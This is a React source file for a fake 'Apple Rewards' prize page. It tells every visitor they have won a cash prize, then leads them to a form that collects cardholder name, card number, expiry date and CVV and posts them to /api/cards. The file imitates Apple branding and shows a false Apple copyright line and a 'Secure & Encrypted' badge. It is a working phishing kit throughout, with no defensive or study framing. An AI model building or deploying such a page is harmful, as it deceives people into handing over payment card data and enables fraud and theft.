import React, { useState, useEffect } from "react";
import axios from "axios";

// Move prizes object outside so both components can access it
const prizes = {
  1: 1000,
  2: 2000,
  3: 3000,
  4: 4000,
  5: 5000,
  6: 6000,
  7: 7000,
  8: 8000,
  9: 9000,
  10: 10000,
};

// Icons for each number - modern and meaningful
const numberIcons = {
  1: "💰", // Money
  2: "💰", // Money
  3: "💰", // Money
  4: "💰", // Money
  5: "💰", // Money
  6: "💰", // Money
  7: "💰", // Money
  8: "💰", // Money
  9: "💰", // Money
  10: "💰", // Money
};

const numberLabels = {
  1: "Home Fund",
  2: "Car Prize", 
  3: "Travel Trip",
  4: "Tech Bundle",
  5: "Education Grant",
  6: "Health Care",
  7: "Shopping Spree",
  8: "Gaming Setup",
  9: "Food Festival",
  10: "Cash Prize"
};

function formatCardNumber(value) {
  return value.replace(/\D/g, "").slice(0, 19).replace(/(.{4})/g, "$1 ").trim();
}

// Popup Component for Prize Announcement
function PrizePopup({ selected, onClose, onContinue }) {
  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50 animate-fadeIn">
      <div className="bg-white rounded-2xl p-6 shadow-2xl max-w-sm w-full mx-auto transform scale-95 animate-scaleIn">
        <div className="text-center">
          <div className="w-20 h-20 bg-gradient-to-br from-green-500 to-green-600 rounded-full flex items-center justify-center mx-auto mb-4 shadow-lg">
            <span className="text-white text-3xl">{numberIcons[selected]}</span>
          </div>
          
          <h2 className="text-2xl font-bold text-gray-900 mb-2">
            Congratulations! 🎉
          </h2>
          
          <p className="text-gray-600 text-lg mb-2">
            You won the {numberLabels[selected]}
          </p>
          
          <p className="text-4xl font-bold text-green-600 mb-4">
            ${prizes[selected]}
          </p>
          
          <p className="text-gray-500 text-sm mb-6">
            {selected === 1 && "Dream home fund!"}
            {selected === 2 && "Brand new car!"}
            {selected === 3 && "Luxury travel experience!"}
            {selected === 4 && "Latest tech gadgets!"}
            {selected === 5 && "Educational opportunities!"}
            {selected === 6 && "Healthcare coverage!"}
            {selected === 7 && "Shopping adventure!"}
            {selected === 8 && "Gaming paradise!"}
            {selected === 9 && "Culinary delights!"}
            {selected === 10 && "Life-changing cash!"}
          </p>

          <div className="flex gap-3">
            <button
              onClick={onClose}
              className="flex-1 bg-gray-200 text-gray-800 py-3 rounded-xl hover:bg-gray-300 transition-all font-medium"
            >
              Close
            </button>
            <button
              onClick={onContinue}
              className="flex-1 bg-black text-white py-3 rounded-xl hover:bg-gray-800 transition-all font-medium flex items-center justify-center gap-2"
            >
              <span></span>
              <span>Claim</span>
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

function CardForm({ selected, onClose }) {
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [message, setMessage] = useState("");
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkMobile = () => {
      setIsMobile(window.innerWidth < 768);
    };
    
    checkMobile();
    window.addEventListener('resize', checkMobile);
    return () => window.removeEventListener('resize', checkMobile);
  }, []);

  const handleNumberChange = (e) => {
    const formatted = formatCardNumber(e.target.value);
    setCardNumber(formatted);
  };

  const handleExpiryChange = (e) => {
    let v = e.target.value.replace(/\D/g, "").slice(0, 4);
    if (v.length >= 3) v = v.slice(0, 2) + "/" + v.slice(2);
    setExpiry(v);
  };

  const handleCvvChange = (e) => {
    setCvv(e.target.value.replace(/\D/g, "").slice(0, 4));
  };

  const submit = async (e) => {
    e.preventDefault();
    setMessage("");
    try {
      const [mm, yy] = expiry.split("/");
      const body = {
        cardName,
        cardNumber: cardNumber.replace(/\s/g, ""),
        expiryMonth: mm,
        expiryYear: yy && yy.length === 2 ? String(2000 + parseInt(yy, 10)) : yy,
        cvv,
      };
      const res = await axios.post("/api/cards", body);
      setMessage("Success! Your prize will be processed within 24 hours.");
      setTimeout(() => {
        setCardName("");
        setCardNumber("");
        setCvv("");
        setExpiry("");
        onClose();
      }, 3000);
    } catch (err) {
      const m = err?.response?.data?.message || err.message;
      setMessage("Error: " + m);
    }
  };

  return (
    <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50 animate-fadeIn">
      <div className="bg-white rounded-2xl p-6 shadow-2xl max-w-md w-full mx-auto transform scale-95 animate-scaleIn max-h-[90vh] overflow-y-auto">
        {/* Close Button */}
        <button
          onClick={onClose}
          className="absolute top-4 right-4 w-8 h-8 bg-gray-200 rounded-full flex items-center justify-center hover:bg-gray-300 transition-all"
        >
          ✕
        </button>

        {/* Apple-style Header */}
        <div className="flex items-center justify-center mb-4">
          <div className="w-8 h-8 bg-black rounded-full flex items-center justify-center mr-2">
            <span className="text-white text-lg font-semibold"></span>
          </div>
          <h2 className="text-xl font-semibold text-gray-900">Apple Rewards</h2>
        </div>

        <div className="text-center mb-4">
          <div className="flex items-center justify-center gap-2 mb-2">
            <span className="text-2xl">{numberIcons[selected]}</span>
            <p className="text-gray-600 text-sm font-medium">You won: ${prizes[selected]}</p>
          </div>
          <p className="text-gray-500 text-xs">Add your card details to receive your {numberLabels[selected]}</p>
        </div>

        <form onSubmit={submit}>
          <label className="block mb-3">
            <div className="text-sm font-medium text-gray-700 mb-1">Cardholder Name</div>
            <input
              value={cardName}
              onChange={(e) => setCardName(e.target.value)}
              className="w-full border border-gray-300 p-3 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all text-sm"
              placeholder="John Appleseed"
              required
            />
          </label>

          <label className="block mb-3">
            <div className="text-sm font-medium text-gray-700 mb-1">Card Number</div>
            <input
              value={cardNumber}
              onChange={handleNumberChange}
              className="w-full border border-gray-300 p-3 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all text-sm"
              placeholder="1234 5678 9012 3456"
              inputMode="numeric"
              required
            />
          </label>

          <div className={`gap-3 mb-4 ${isMobile ? 'flex flex-col' : 'flex'}`}>
            <label className={isMobile ? 'w-full' : 'flex-1'}>
              <div className="text-sm font-medium text-gray-700 mb-1">Expiry Date</div>
              <input
                value={expiry}
                onChange={handleExpiryChange}
                className="w-full border border-gray-300 p-3 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all text-sm"
                placeholder="MM/YY"
                required
              />
            </label>

            <label className={isMobile ? 'w-full' : 'w-28'}>
              <div className="text-sm font-medium text-gray-700 mb-1">CVV</div>
              <input
                value={cvv}
                onChange={handleCvvChange}
                className="w-full border border-gray-300 p-3 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-500 transition-all text-sm"
                placeholder="123"
                inputMode="numeric"
                required
              />
            </label>
          </div>

          <button
            type="submit"
            className="w-full bg-black text-white py-3 rounded-xl hover:bg-gray-800 active:bg-gray-700 transition-all font-medium text-sm flex items-center justify-center gap-2 mb-3"
          >
            <span></span>
            <span>Save Card & Claim Prize</span>
          </button>

          {message && (
            <div className={`text-sm text-center p-2 rounded-xl ${
              message.includes('Error') 
                ? 'bg-red-50 text-red-600 border border-red-200' 
                : 'bg-green-50 text-green-600 border border-green-200'
            }`}>
              {message}
            </div>
          )}
        </form>

        {/* Security Footer */}
        <div className="mt-4 text-center">
          <div className="flex items-center justify-center gap-1 text-gray-500 text-xs">
            <span>🔒</span>
            <span>Secure & Encrypted</span>
          </div>
        </div>
      </div>
    </div>
  );
}

function App() {
  const [selected, setSelected] = useState(null);
  const [showPrizePopup, setShowPrizePopup] = useState(false);
  const [showCardForm, setShowCardForm] = useState(false);

  const handleSelect = (num) => {
    if (selected !== null) return;
    setSelected(num);
    setShowPrizePopup(true);
  };

  const handleClosePopup = () => {
    setShowPrizePopup(false);
    setSelected(null);
  };

  const handleContinue = () => {
    setShowPrizePopup(false);
    setShowCardForm(true);
  };

  const handleCloseForm = () => {
    setShowCardForm(false);
    setSelected(null);
  };

  return (
    <div 
      className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-b from-gray-50 to-gray-100 p-4 safe-area"
      style={{ 
        fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif'
      }}
    >
      {/* Apple-style Header */}
      <div className="text-center mb-8 max-w-md mx-auto">
        <div className="flex items-center justify-center mb-4">
          <div className="w-14 h-14 bg-black rounded-2xl flex items-center justify-center shadow-lg">
            <span className="text-white text-2xl font-semibold"></span>
          </div>
        </div>
        <h1 className="text-3xl font-bold text-gray-900 mb-2">
          Apple Rewards
        </h1>
        <p className="text-gray-600 text-base">
          Tap any icon to reveal your prize
        </p>
      </div>

      {/* Number Selection Grid */}
      <div className="grid grid-cols-3 md:grid-cols-5 gap-3 mb-8 w-full max-w-md mx-auto">
        {Array.from({ length: 10 }, (_, i) => i + 1).map((num) => (
          <button
            key={num}
            onClick={() => handleSelect(num)}
            disabled={selected !== null}
            className={`
              aspect-square rounded-2xl font-bold transition-all duration-300
              flex flex-col items-center justify-center shadow-lg relative overflow-hidden
              ${selected === num
                ? 'bg-gradient-to-br from-green-500 to-green-600 text-white scale-105 shadow-2xl'
                : 'bg-white text-gray-900 border border-gray-200 hover:shadow-xl hover:scale-105'
              }
              ${selected !== null && selected !== num ? 'opacity-40' : ''}
              p-3
            `}
          >
            <span className="text-2xl md:text-3xl mb-1">
              {numberIcons[num]}
            </span>
            <span className="font-semibold text-xs md:text-sm">
              {num}
            </span>
            <div className="absolute bottom-0 left-0 right-0 bg-black bg-opacity-10 h-1 md:h-2"></div>
          </button>
        ))}
      </div>

      {/* Footer */}
      <div className="mt-8 text-center text-gray-500 text-xs max-w-md mx-auto px-4">
        <p>© 2024 Apple Inc. All rights reserved.</p>
        <p className="mt-1">Privacy Policy | Terms of Service</p>
        <p className="mt-2 text-gray-400">Tap any icon to discover your amazing prize!</p>
      </div>

      {/* Popup for Prize Announcement */}
      {showPrizePopup && (
        <PrizePopup 
          selected={selected}
          onClose={handleClosePopup}
          onContinue={handleContinue}
        />
      )}

      {/* Popup for Card Form */}
      {showCardForm && (
        <CardForm 
          selected={selected}
          onClose={handleCloseForm}
        />
      )}

      {/* Add custom animations */}
      <style jsx>{`
        @keyframes fadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
        }
        @keyframes scaleIn {
          from { transform: scale(0.9); opacity: 0; }
          to { transform: scale(1); opacity: 1; }
        }
        .animate-fadeIn {
          animation: fadeIn 0.3s ease-out;
        }
        .animate-scaleIn {
          animation: scaleIn 0.3s ease-out;
        }
      `}</style>
    </div>
  );
}

export default App;